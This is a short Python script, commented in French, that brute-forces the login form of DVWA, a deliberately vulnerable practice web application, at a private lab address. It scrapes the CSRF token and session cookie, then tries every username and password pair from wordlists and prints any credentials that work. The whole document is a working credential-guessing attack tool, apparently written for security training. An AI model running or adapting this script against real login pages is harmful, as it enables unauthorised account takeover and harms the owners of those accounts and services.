# alternative kali => hydra, patator
import requests
import re
# pip install beautifulsoup4 : scrapper universel
from bs4 import BeautifulSoup

URL = "http://192.168.1.44/DVWA/login.php"

def get_csrf_token():
    # hypothèse: le script login.php régénère le champ "user_token"
    # du formulaire (token CSRF: Cross Site Request Forgery) 
    # quand il redirige la page en POST
    ## => tester la requête quand on annule les redirections
    r = requests.get(URL, allow_redirects=False)
    soup = BeautifulSoup(r.text, "html.parser")
    user_token = soup("input", {"name": "user_token"})[0]["value"]

    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"]).group(1)
    return user_token, session_id

def brute_force(user_token, session_id):
    with open("users.txt", "r", encoding="utf8") as user_f:
        users = user_f.readlines()
    with open("passwords.txt", "r", encoding="utf8") as pass_f:
        passwds = pass_f.readlines()

    for user in users:
        user = user.strip("\r\n")
        for passwd in passwds:
            passwd = passwd.strip("\r\n")
            r = requests.post(
                URL,
                allow_redirects=False,
                cookies={"PHPSESSID": session_id}, 
                data={
                    "username": user,
                    "password": passwd,
                    "user_token": user_token,
                    "Login": "Login"
                })
            if r.status_code not in (301, 302):
                raise ValueError("pb with redirections !!")
            ## inspecter le header set-cookie pour vérifier 
            # que le session_id est figé => hypothèse que le token également
            ## la réponse 302 contient un header Location qui 
            # détaille la page à charger
            # si c'est login.php => mauvais login / passwd
            # sinon => bon credentials
            if r.headers["location"] != "login.php":
                print(f"detected credentials: {user} / {passwd}")

if __name__ == "__main__":
    user_token, session_id = get_csrf_token()
    brute_force(user_token, session_id)
    

        

